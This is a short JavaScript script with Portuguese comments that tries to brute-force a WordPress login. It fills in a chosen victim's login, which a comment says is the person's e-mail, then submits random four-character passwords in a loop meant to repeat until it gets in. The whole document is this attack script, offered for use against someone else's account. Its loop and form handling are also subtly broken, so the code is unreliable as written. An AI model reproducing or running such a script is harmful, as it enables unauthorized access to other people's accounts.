function geradorAleatorio(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
} // Esta funcao gera um string aleatório, com base no tamanho desejado e conjunto de caracteres

function guessTentativa () {

meuLogin.value = "papainoel"; // insira o login desejado (e-mail da pessoa)
minhaSenha.value = geradorAleatorio(4, 'ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz1234567890'); // Insira o conjunto de caracteres

form = document.getElementById("wp-submit"); // seleciona o formulario
form.method = 'post'; // seleciona o método de envio do formulario
document.forms["loginform"].submit(); // envia o formulario

}

var meuLogin = document.getElementById("user_login"); // variavel de login
var minhaSenha = document.getElementById("user_pass"); // variavel de senha

window.setInterval(guessTentativa(), 200); // repete o programa em um intervalo de segundos até entrar
